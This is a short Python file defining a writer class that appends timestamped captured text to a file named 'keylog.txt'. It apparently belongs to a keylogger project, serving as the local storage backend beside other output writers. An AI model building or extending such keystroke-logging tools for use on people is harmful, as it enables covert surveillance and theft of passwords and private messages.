from datetime import datetime

from writers.base import IWriter


class SaveToFile(IWriter):

    def __init__(self, destination: str, machine_id: int) -> None:
        super().__init__(destination, machine_id)

    def send_data(self, data) -> int:
        with open("keylog.txt", "a", encoding="utf-8") as f:
            for ts, arr_text in data:
                f.write(f"{datetime.fromtimestamp(ts)}\n{arr_text}\n\n")
        return 200
